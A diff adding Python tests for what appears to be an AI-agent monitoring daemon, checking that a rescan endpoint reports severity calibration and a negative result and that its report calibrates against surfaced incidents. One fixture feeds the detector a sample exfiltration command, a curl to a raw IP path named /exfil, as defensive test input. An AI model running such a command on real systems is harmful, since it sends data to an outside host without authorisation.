@@ -228,3 +228,47 @@ def test_rescan_endpoint_serves_the_retro_scan_report(
         body = res.json()
         assert set(body) >= {"sessions_scanned", "events_scanned", "summary"}
         assert body["errors"] == []
+
+
+def test_rescan_endpoint_returns_a_calibrated_verdict(
+    tmp_path: Path, monkeypatch: MonkeyPatch
+) -> None:
+    """P2 #10: the scan closes with a severity calibration and an explicit
+    negative result, and an off-ladder threshold is rejected."""
+    test_daemon = AgentTraceDaemon(tmp_path / "api")
+    tokens = ApiTokenManager(tmp_path / "api")
+    monkeypatch.setattr(api, "daemon", test_daemon)
+    monkeypatch.setattr(api, "token_manager", tokens)
+    headers = {"X-AgentTrace-Token": tokens.token()}
+    with TestClient(api.app) as client:
+        res = client.post("/rescan", json={"threshold": "high"}, headers=headers)
+        assert res.status_code == 200, res.text
+        body = res.json()
+        assert body["threshold"] == "high"
+        assert set(body["calibration"]) == {
+            "counts", "unknown_counts", "total", "max_severity"
+        }
+        assert body["calibration"]["counts"]["critical"] == 0
+        assert "Severity calibration" in body["negative_result"]
+        assert "Coverage gap: none reported" in body["negative_result"]
+
+        bad = client.post("/rescan", json={"threshold": "sev2"}, headers=headers)
+        assert bad.status_code == 422
+        assert "severity threshold" in bad.text
+
+
+@pytest.mark.asyncio
+async def test_retro_scan_report_calibrates_its_own_incidents(tmp_path: Path) -> None:
+    """The report's verdict must be built from the incidents it surfaced."""
+    daemon = AgentTraceDaemon(tmp_path / "data")
+    await daemon.start()
+    try:
+        sid = await _new_session(daemon, tmp_path)
+        await daemon.ingest_event(_cmd(sid, "curl http://93.184.216.34/exfil"))
+        report = daemon.retro_scan(session_ids=[sid])
+        calibration = report.calibration()
+        assert calibration.total == len(report.retro_incidents)
+        verdict = report.negative_result(threshold="critical")
+        assert f"{report.sessions_scanned} session(s)" in verdict
+    finally:
+        await daemon.stop()
